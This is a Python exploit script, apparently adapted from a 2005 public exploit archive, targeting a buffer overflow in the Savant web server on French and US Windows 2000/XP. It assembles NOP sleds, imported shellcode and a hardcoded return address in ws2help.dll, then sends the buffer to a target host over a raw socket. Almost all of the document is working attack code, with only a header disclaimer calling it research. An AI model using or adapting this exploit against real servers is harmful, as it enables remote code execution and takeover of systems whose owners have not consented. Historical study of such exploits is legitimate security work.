#########################################################
#                                                       #
# Savant web server Buffer Overflow Exploit             #
# Discovered by : Mati Aharoni                          #
# Coded by : Tal Zeltzer and Mati Aharoni               #
# www.see-security.com                                  #
# FOR RESEACRH PURPOSES ONLY!                           #
# FRench Win OS support by Jerome Athias                #
#########################################################
from payload import buf
import socket
import struct
def shell_attack(target_machine, target_port):
   
    extra  = b"AA"
    nops = b"\x90" *21
    # Win2k SP0,1,2,3,4 (US...)
    #Change Return address as needed
    #buf = "\xEB\x19" + " /" + sc + struct.pack("<L",0x750236b2) + "\r\n\r\n"

    #0x74FA2AC4		pop esi - pop - ret	ws2help.dll	Win 2K SP4 FR (Found with findjmp2 by Class101 ;)
    #buf = "\x90" * 24 + " /" + sc + struct.pack("<L",0x74fa2ac5) + "\r\n\r\n"	#EB becomes CB...? so i changed it by nops

    #Win XP SP2 FR?
    #0x719E260D		pop esi - pop - ret	ws2help.dll	Win XP SP2 FR (Found with findjmp2 by Class101 ;)
    buffer = b"\x90" * 24 + b" /" + nops +extra + buf + struct.pack(b"<L",0x74fa2ac5)  + b"\r\n\r\n"	#EB becomes CB...? so i changed it by nops


    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((target_machine,target_port))
    s.send(buffer)
    s.close()

    # milw0rm.com [2005-02-15]